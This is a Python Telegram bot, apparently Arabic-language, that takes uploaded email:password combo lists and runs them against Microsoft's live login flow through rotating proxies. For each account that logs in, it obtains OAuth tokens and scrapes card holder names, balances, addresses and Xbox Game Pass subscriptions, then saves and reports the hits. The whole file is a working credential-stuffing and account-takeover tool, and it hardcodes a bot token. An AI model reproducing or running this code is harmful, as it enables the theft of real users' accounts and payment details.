import re
import uuid
import time
import os
import json
import requests
import threading
import asyncio
from datetime import datetime
from pathlib import Path
from urllib.parse import quote, unquote
from threading import Lock
from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters

# ─── Proxy Manager ───────────────────────────────────────────────
class ProxyManager:
    def __init__(self, proxy_file=None, proxy_str=None):
        self.proxies = []
        self.lock = Lock()
        self.idx = 0

        if proxy_str:
            self.proxies.append(self._parse_line(proxy_str))
        if proxy_file and os.path.isfile(proxy_file):
            with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    p = self._parse_line(line.strip())
                    if p:
                        self.proxies.append(p)

    def _parse_line(self, line):
        if not line or line.startswith('#'):
            return None
        parts = line.split(':')
        if len(parts) == 2:
            return {"http": f"http://{parts[0]}:{parts[1]}",
                    "https": f"http://{parts[0]}:{parts[1]}"}
        elif len(parts) == 4:
            user, pwd = parts[2], parts[3]
            auth = f"{user}:{pwd}@{parts[0]}:{parts[1]}"
            return {"http": f"http://{auth}",
                    "https": f"http://{auth}"}
        return None

    def has_proxies(self):
        return len(self.proxies) > 0

    def get_random_proxy(self):
        if not self.proxies:
            return None
        with self.lock:
            p = self.proxies[self.idx % len(self.proxies)]
            self.idx += 1
            return p


# ─── Xbox Checker ────────────────────────────────────────────────
class XboxChecker:
    def __init__(self, proxy_manager=None):
        self.proxy_manager = proxy_manager

    def get_session(self):
        session = requests.Session()
        if self.proxy_manager and self.proxy_manager.has_proxies():
            proxy = self.proxy_manager.get_random_proxy()
            if proxy:
                session.proxies.update(proxy)
        return session

    def get_remaining_days(self, date_str):
        try:
            if not date_str:
                return "EXPIRED"
            date_str = date_str.replace('Z', '+00:00')
            try:
                renewal_date = datetime.fromisoformat(date_str)
            except:
                try:
                    renewal_date = datetime.strptime(date_str, "%Y-%m-%dT%H:%M:%S%z")
                except:
                    try:
                        renewal_date = datetime.strptime(date_str.split('+')[0].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                        renewal_date = renewal_date.replace(tzinfo=datetime.now().astimezone().tzinfo)
                    except:
                        return "UNKNOWN"
            today = datetime.now(renewal_date.tzinfo)
            remaining = (renewal_date - today).days
            if remaining < 0:
                return "EXPIRED"
            return str(remaining)
        except Exception:
            return "UNKNOWN"

    def check(self, email, password):
        try:
            session = self.get_session()
            correlation_id = str(uuid.uuid4())

            time.sleep(1)

            url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" + email
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": correlation_id,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }
            r1 = session.get(url1, headers=headers1, timeout=15)

            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                return {"status": "BAD"}
            if "MSAccount" not in r1.text:
                return {"status": "BAD"}

            time.sleep(0.3)

            url2 = ("https://login.live.com/oauth20_authorize.srf?"
                    "client_id=0000000048170EF2"
                    "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                    "&response_type=code"
                    "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
                    "&display=touch&username=" + email)

            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            r2 = session.get(url2, headers=headers2, allow_redirects=True, timeout=15)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)

            if not url_match or not ppft_match:
                return {"status": "BAD"}

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            login_data = ("i13=1&login=" + email + "&loginfmt=" + email +
                          "&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=" +
                          "&passwd=" + password +
                          "&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=" +
                          "&canary=&ctx=&hpgrequestid=&PPFT=" + ppft +
                          "&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0" +
                          "&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0" +
                          "&isRecoveryAttemptPost=0&i19=9960")

            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }
            r3 = session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=15)

            if "account or password is incorrect" in r3.text:
                return {"status": "BAD"}
            if "https://account.live.com/identity/confirm" in r3.text:
                return {"status": "2FA", "email": email, "password": password}
            if "https://account.live.com/Abuse" in r3.text:
                return {"status": "BANNED"}
            if "too many" in r3.text.lower() or "locked out" in r3.text.lower() or "try again later" in r3.text.lower():
                return {"status": "RETRY"}
            if "0x80049DD3" in r3.text:
                return {"status": "CUSTOM", "data": {"reason": "No consent"}}

            hr_match = re.search(r'HR=0x([0-9A-Fa-f]+)', r3.text)
            if hr_match and len(r3.text) < 5000:
                return {"status": "CUSTOM", "data": {"reason": f"HR=0x{hr_match.group(1)}"}}

            location = r3.headers.get("Location", "")
            if not location:
                return {"status": "BAD"}

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                return {"status": "BAD"}

            code = code_match.group(1)

            token_data = ("client_id=0000000048170EF2"
                          "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
                          "&grant_type=authorization_code&code=" + code +
                          "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL")

            r4 = session.post("https://login.live.com/oauth20_token.srf",
                              data=token_data,
                              headers={"Content-Type": "application/x-www-form-urlencoded"},
                              timeout=15)

            if "access_token" not in r4.text:
                return {"status": "BAD"}

            token_json = r4.json()
            access_token = token_json["access_token"]

            country = ""
            name = ""

            time.sleep(0.3)

            user_id = str(uuid.uuid4()).replace('-', '')[:16]
            state_json = json.dumps({"userId": user_id, "scopeSet": "pidl"})
            payment_auth_url = ("https://login.live.com/oauth20_authorize.srf?"
                                "client_id=000000000004773A"
                                "&response_type=token"
                                "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
                                "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
                                "&state=" + quote(state_json) + "&prompt=none")

            headers6 = {
                "Host": "login.live.com",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive",
                "Referer": "https://account.microsoft.com/"
            }
            r6 = session.get(payment_auth_url, headers=headers6, allow_redirects=True, timeout=20)

            payment_token = None
            search_text = r6.text + " " + r6.url
            for pattern in [r'access_token=([^&\s"\']+)', r'"access_token":"([^"]+)"']:
                match = re.search(pattern, search_text)
                if match:
                    payment_token = unquote(match.group(1))
                    break

            if not payment_token:
                return {"status": "FREE", "data": {"country": country, "name": name}}

            payment_data = {"country": country, "name": name}
            correlation_id2 = str(uuid.uuid4())

            payment_headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Pragma": "no-cache",
                "Accept": "application/json",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                "Authorization": 'MSADELEGATE1.0="' + payment_token + '"',
                "Connection": "keep-alive",
                "Content-Type": "application/json",
                "Host": "paymentinstruments.mp.microsoft.com",
                "ms-cV": correlation_id2,
                "Origin": "https://account.microsoft.com",
                "Referer": "https://account.microsoft.com/",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-site"
            }

            try:
                payment_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US"
                r7 = session.get(payment_url, headers=payment_headers, timeout=15)

                if r7.status_code == 200:
                    balance_match = re.search(r'"balance"\s*:\s*([0-9.]+)', r7.text)
                    if balance_match:
                        payment_data['balance'] = "$" + balance_match.group(1)

                    card_match = re.search(r'"paymentMethodFamily"\s*:\s*"credit_card".*?"name"\s*:\s*"([^"]+)"', r7.text, re.DOTALL)
                    if card_match:
                        payment_data['card_holder'] = card_match.group(1)

                    if not country:
                        country_match = re.search(r'"country"\s*:\s*"([^"]+)"', r7.text)
                        if country_match:
                            payment_data['country'] = country_match.group(1)

                    zip_match = re.search(r'"postal_code"\s*:\s*"([^"]+)"', r7.text)
                    if zip_match:
                        payment_data['zipcode'] = zip_match.group(1)

                    city_match = re.search(r'"city"\s*:\s*"([^"]+)"', r7.text)
                    if city_match:
                        payment_data['city'] = city_match.group(1)
            except:
                pass

            try:
                sub_urls = [
                    "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/subscriptions",
                    "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions"
                ]

                premium_keywords = {
                    'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE',
                    'Game Pass Ultimate': 'GAME PASS ULTIMATE',
                    'PC Game Pass': 'PC GAME PASS',
                    'Xbox Game Pass for Console': 'XBOX GAME PASS CONSOLE',
                    'Xbox Game Pass Core': 'GAME PASS CORE',
                    'Game Pass Core': 'GAME PASS CORE',
                    'Xbox Game Pass': 'GAME PASS',
                    'Game Pass': 'GAME PASS',
                    'Xbox Live Gold': 'XBOX LIVE GOLD',
                    'EA Play': 'EA PLAY',
                }

                all_text = ""
                for sub_url in sub_urls:
                    try:
                        r8 = session.get(sub_url, headers=payment_headers, timeout=15)
                        if r8.status_code == 200:
                            all_text += r8.text + "\n"
                    except:
                        continue

                if not all_text:
                    return {"status": "FREE", "data": payment_data}

                all_dates = re.findall(r'"(?:nextRenewalDate|expirationDate|validTo)"\s*:\s*"([^"]+)"', all_text)

                found_type = None
                for keyword, type_name in premium_keywords.items():
                    if keyword.lower() in all_text.lower():
                        found_type = type_name
                        break

                if not found_type:
                    return {"status": "FREE", "data": payment_data}

                best_date = None
                best_days = -1
                for date_str in all_dates:
                    days = self.get_remaining_days(date_str)
                    if days.isdigit():
                        days_int = int(days)
                        if days_int > best_days:
                            best_days = days_int
                            best_date = date_str

                auto_match = re.search(r'"autoRenew"\s*:\s*(true|false)', all_text)
                auto_renew = "YES" if (auto_match and auto_match.group(1) == "true") else "NO"

                if best_days > 0:
                    sub_data = {
                        'premium_type': found_type,
                        'renewal_date': best_date,
                        'days_remaining': str(best_days),
                        'auto_renew': auto_renew
                    }
                    amount_match = re.search(r'"totalAmount"\s*:\s*([0-9.]+)', all_text)
                    if amount_match:
                        sub_data['total_amount'] = amount_match.group(1)
                    currency_match = re.search(r'"currency"\s*:\s*"([^"]+)"', all_text)
                    if currency_match:
                        sub_data['currency'] = currency_match.group(1)
                    return {"status": "PREMIUM", "data": {**payment_data, **sub_data}}
                else:
                    oldest_date = all_dates[0] if all_dates else "N/A"
                    sub_data = {
                        'premium_type': found_type,
                        'renewal_date': oldest_date,
                        'days_remaining': "0",
                        'expired': True,
                        'auto_renew': auto_renew
                    }
                    return {"status": "EXPIRED", "data": {**payment_data, **sub_data}}

            except:
                pass

            return {"status": "FREE", "data": payment_data}

        except requests.exceptions.Timeout:
            return {"status": "TIMEOUT"}
        except requests.exceptions.ProxyError:
            return {"status": "ERROR"}
        except Exception:
            return {"status": "ERROR"}


# ─── Stats & Result Manager for Bot ──────────────────────────────
class BotResultManager:
    def __init__(self, base_folder="bot_results"):
        self.base_folder = base_folder
        Path(self.base_folder).mkdir(parents=True, exist_ok=True)
        self.file_lock = Lock()

    def save_result(self, email, password, result):
        status = result['status']
        line = f"{email}:{password}"
        filename = os.path.join(self.base_folder, f"{status}.txt")
        with self.file_lock:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(f"{line}\n")


class Stats:
    def __init__(self):
        self.lock = Lock()
        self.checked = 0
        self.premium = 0
        self.free = 0
        self.expired = 0
        self.bad = 0
        self.twofa = 0
        self.banned = 0
        self.error = 0
        self.retry = 0
        self.custom = 0

    def inc(self, key, val=1):
        with self.lock:
            if hasattr(self, key):
                setattr(self, key, getattr(self, key) + val)


# ─── Telegram Bot Logic ──────────────────────────────────────────
TOKEN = "8896382526:AAEySaJWfg6pQpoRuSu8zQaG50uJ_Jf0obg"
app_loop = None

async def post_init(application):
    global app_loop
    app_loop = asyncio.get_running_loop()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "مرحباً بك في بوت فحص حسابات إكس بوكس (Xbox Checker Bot).\n"
        "أرسل ملف الكومبو بصيغة (email:password) وابدأ الفحص فوراً!"
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    file = await update.message.document.get_file()
    file_path = f"downloads_{update.effective_user.id}.txt"
    await file.download_to_drive(file_path)

    await update.message.reply_text("📥 تم استقبال الملف بنجاح، جاري بدء الفحص...")

    proxy_manager = None
    checker = XboxChecker(proxy_manager=proxy_manager)
    results_mgr = BotResultManager(f"results_{update.effective_user.id}")
    stats = Stats()

    combos = []
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                combos.append((parts[0].strip(), parts[1].strip()))

    if not combos:
        await update.message.reply_text("❌ الملف فارغ أو غير صالح.")
        return

    await update.message.reply_text("⏳ جاري فحص الحسابات...")

    bot_app = context.bot
    chat_id = update.effective_chat.id

    def run_checking():
        for email, pwd in combos:
            res = checker.check(email, pwd)
            status = res.get("status")
            
            if status == "PREMIUM":
                stats.inc("premium")
            elif status == "FREE":
                stats.inc("free")
            elif status == "EXPIRED":
                stats.inc("expired")
            elif status == "BAD":
                stats.inc("bad")
            elif status == "2FA":
                stats.inc("twofa")
            elif status == "BANNED":
                stats.inc("banned")
            else:
                stats.inc("error")

            results_mgr.save_result(email, pwd, res)

            if status == "PREMIUM":
                data = res.get('data', {})
                text = (f"🔥 **حساب بريميوم جديد!**\n"
                        f"📧 البريد: `{email}:{pwd}`\n"
                        f"🎮 النوع: `{data.get('premium_type', 'N/A')}`\n"
                        f"⏳ الأيام المتبقية: `{data.get('days_remaining', '0')}`")
                try:
                    if app_loop and app_loop.is_running():
                        asyncio.run_coroutine_threadsafe(
                            bot_app.send_message(chat_id=chat_id, text=text, parse_mode="Markdown"),
                            app_loop
                        )
                except:
                    pass

    threading.Thread(target=run_checking).start()
    await update.message.reply_text("🚀 بدأت عملية الفحص في الخلفية، سيتم إعلامك بالنتائج أولاً بأول.")


def main():
    app = ApplicationBuilder().token(TOKEN).post_init(post_init).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
